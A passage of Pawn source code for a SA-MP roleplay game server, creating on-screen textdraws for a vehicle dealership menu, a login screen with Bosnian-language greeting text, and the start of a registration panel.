		PlayerTextDrawSetPreviewRot(playerid, SalonVozila_pTD[playerid][3], -35.000000, 0.000000, -35.000000, 1.000000);
		PlayerTextDrawSetPreviewVehCol(playerid, SalonVozila_pTD[playerid][3], 1, 1);

		SalonVozila_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 558.567016, 255.525833, "box");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][4], 0.000000, 0.989331);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][4], 636.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][4], -1);
		PlayerTextDrawUseBox(playerid, SalonVozila_pTD[playerid][4], 1);
		PlayerTextDrawBoxColor(playerid, SalonVozila_pTD[playerid][4], -1392179934);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][4], 1);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][4], 0);

		new salonstring[32];
		format(salonstring, sizeof(salonstring), "Model: ~y~%s", SalonVozila[as_Model[playerid]][vName]); 
		SalonVozila_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 596.333435, 255.940734, salonstring); //model
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][5], 0.132666, 0.762074);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][5], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][5], 2);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][5], 0);

		SalonVozila_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 558.567016, 270.426727, "box");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][6], 0.000000, 0.989331);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][6], 636.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][6], -1);
		PlayerTextDrawUseBox(playerid, SalonVozila_pTD[playerid][6], 1);
		PlayerTextDrawBoxColor(playerid, SalonVozila_pTD[playerid][6], -1392179934);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][6], 1);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][6], 0);

		SalonVozila_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 558.567016, 285.127624, "box");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][7], 0.000000, 0.989331);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][7], 636.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][7], -1);
		PlayerTextDrawUseBox(playerid, SalonVozila_pTD[playerid][7], 1);
		PlayerTextDrawBoxColor(playerid, SalonVozila_pTD[playerid][7], -1392179934);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][7], 1);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][7], 0);

		format(salonstring, sizeof(salonstring), "Price: ~y~$%d", SalonVozila[as_Model[playerid]][vPrice]);
		PlayerTextDrawSetString(playerid, SalonVozila_pTD[playerid][8], salonstring);
		SalonVozila_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 596.533386, 270.741638, salonstring); //price
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][8], 0.129333, 0.778666);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][8], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][8], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][8], 2);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][8], 0);

		SalonVozila_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 596.666503, 285.957366, "BUY");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][9], 0.138333, 0.741333);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][9], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][9], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][9], 0);
		PlayerTextDrawSetSelectable(playerid, SalonVozila_pTD[playerid][9], true);

		SalonVozila_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 576.233276, 285.807434, "<<");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][10], 0.116999, 0.840888);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][10], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][10], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][10], 2);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][10], 0);
		PlayerTextDrawSetSelectable(playerid, SalonVozila_pTD[playerid][10], true);

		SalonVozila_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 616.723388, 285.807434, ">>");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][11], 0.116999, 0.840888);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][11], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][11], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][11], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][11], 2);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][11], 0);
		PlayerTextDrawSetSelectable(playerid, SalonVozila_pTD[playerid][11], true);

		for(new i; i < 12; i++) PlayerTextDrawShow(playerid, SalonVozila_pTD[playerid][i]);

		SelectTextDraw(playerid, 0xFFFFFFAA);
	}
	else
	{
		for(new i; i < 12; i++)
		{
			PlayerTextDrawHide(playerid, SalonVozila_pTD[playerid][i]);
			PlayerTextDrawDestroy(playerid, SalonVozila_pTD[playerid][i]);
			SalonVozila_pTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
		}
		CancelSelectTextDraw(playerid);
	}
}

//------------------------------------------------------------------------------

_:public Login_TDControl( playerid, bool:show )
{
	if( show == true )
	{
		Login_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 199.211318, 49.626739, "box");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][0], 0.000000, 9.822216);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][0], 436.100128, 0.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, Login_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, Login_pTD[playerid][0], 90);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][0], 0);

		Login_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 194.777786, 127.622215, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][1], 246.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][1], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][1], 0);

		Login_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 283.822082, 140.019989, "WWW.ULTIMATE-RPG.COM");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][2], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][2], 1064746239);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][2], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][2], 0);

		new str[50 + 55 + 50 + 60 + 65 + 65];
		format(str, sizeof(str), "~w~Pozdrav, ~y~%s.~n~\
									~w~Dobrodosli nazad na ~y~Ultimate RPG ~w~server.~n~\
									~w~Vi ~y~imate ~w~account na ovom serveru.~n~\
									~w~Sve sto trebate napraviti jeste upisati vasu lozinku.~n~\
									~w~Imate ~y~60 ~w~sekundi kako biste upisali vasu lozinku.~n~\
									~w~Takodjer imate ~y~3 ~w~pokusaja da upisite tacno vasu lozinku.", ImeIgraca(playerid));

		Login_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 206.888854, 59.199966, str);
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][3], 0.135995, 0.679022);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][3], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][3], 0);

		Login_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 381.377593, 120.808868, "unesite vasu lozinku kako bi nastavili igru.");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][4], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][4], 3);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][4], 1064746239);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][4], 0);

		Login_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 317.176910, 128.947387, "ultimate community 2018 - 2020 (c) sva prava zadrzana");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][5], 0.132440, 0.628933);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][5], 2);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][5], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][5], 0);

		Login_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 191.833175, 104.724441, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][6], 74.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][6], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][6], 0);

		Login_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 369.989257, 104.826629, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][7], 75.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][7], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][7], 0);

		Login_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 265.888763, 104.926628, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][8], 104.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][8], 65);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][8], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][8], 0);

		Login_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 229.344100, 105.966674, "discord.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][9], 0.115106, 0.649895);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][9], 2);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][9], 0);

		Login_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 407.554962, 105.966674, "ts3.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][10], 0.115106, 0.649895);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][10], 2);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][10], 2);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][10], 0);

		Login_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 428.533325, 49.382190, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][11], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][11], 2.000000, 15.979996);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][11], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][11], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][11], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][11], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][11], 0);

		Login_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 416.977630, 55.355514, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][12], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][12], 2.000000, 9.960021);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][12], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][12], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][12], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][12], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][12], 0);

		Login_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 417.077636, 64.013298, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][13], 13.260004, 2.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][13], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][13], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][13], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][13], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][13], 0);

		Login_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 419.688751, 61.124416, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][14], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][14], 8.000000, 2.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][14], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][14], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][14], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][14], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][14], 0);

		Login_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 419.588806, 53.273269, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][15], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][15], 2.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][15], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][15], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][15], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][15], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][15], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][15], 0);

		Login_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 425.877868, 51.077739, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][16], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][16], 2.000000, 12.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][16], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][16], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][16], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][16], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][16], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][16], 0);

		Login_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 197.488906, 46.082233, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][17], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Login_pTD[playerid][17], 134.000000, 1.000000);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][17], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][17], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][17], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][17], 4);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][17], 0);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][17], 0);

		Login_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 331.722045, 42.557777, "..........");
		PlayerTextDrawLetterSize(playerid, Login_pTD[playerid][18], 0.151666, 0.573911);
		PlayerTextDrawAlignment(playerid, Login_pTD[playerid][18], 1);
		PlayerTextDrawColor(playerid, Login_pTD[playerid][18], 1115865343);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, Login_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, Login_pTD[playerid][18], 255);
		PlayerTextDrawFont(playerid, Login_pTD[playerid][18], 1);
		PlayerTextDrawSetProportional(playerid, Login_pTD[playerid][18], 1);
		PlayerTextDrawSetShadow(playerid, Login_pTD[playerid][18], 0);

		for( new i = 0; i < 19; i ++) PlayerTextDrawShow( playerid, Login_pTD[ playerid ][ i ] );

	    ShowedLogin[playerid] = true;
	}
	else if( show == false )
	{
		for( new i = 0; i < 19; i ++)
		{
			PlayerTextDrawHide( playerid, Login_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Login_pTD[ playerid ][ i ] );
			Login_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		ShowedLogin[ playerid ] = false;
	}
}

//------------------------------------------------------------------------------

_:public RegisterTDControl( playerid, bool:show )
{
	if(show)
	{
 		Register_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 485.822235, 120.813438, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][0], 0.000000, 20.608827);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][0], 615.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][0], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][0], 0);

		Register_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 559.712341, 130.108840, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][1], 2.000000, 26.300006);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][1], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][1], 0);

		Register_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 539.699096, 139.864379, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][2], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][2], 2.000000, 16.599990);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][2], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][2], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][2], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][2], 0);

		Register_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 561.766601, 154.697723, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][3], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][3], -20.280006, 1.899999);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][3], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][3], 0);
